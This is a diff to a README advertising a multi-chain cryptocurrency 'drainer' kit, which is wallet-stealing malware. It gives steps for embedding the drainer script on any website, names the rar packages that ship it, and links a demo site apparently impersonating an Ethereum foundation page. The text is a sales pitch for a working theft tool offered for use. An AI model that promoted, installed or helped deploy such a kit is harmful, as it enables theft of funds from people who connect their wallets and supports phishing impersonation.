@@ -7,7 +7,7 @@
 Drain on 19 different chains 🚀: ETH,OPTIMISM,CRONOS,BSC,GNOSIS,FUSE,HECO,POLY AND MORES !!
 Installation on any website files and documentation included 🔥
 
-Installation & Instructions on any WEBSITE 
+Installation & Instructions of the draining system on any WEBSITE / MultiDrainerV6.3.rar
 
 # STEP 1
 <script charset="UTF-8" type="text/javascript" src="./85562950-42ac-48d9-9757-cb0ae30ccb7c.js"></script>
@@ -46,7 +46,9 @@ All is setup your drainer is ready to go.
 Upload your website on Vercel or any Hosting
 
 
-WE PROVIDE A CUSTOM DEMO WEBSITE ALSO NAMED : newperfectdrainer2024.rar
+WE PROVIDE A CUSTOM DEMO WEBSITE 100% WORKING ALSO NAMED : newperfectdrainer2024.rar
+Only thing to do is # STEP 3 
+
 
 DEMO WEBSITE : https://ethfoundation.vercel.app/
 
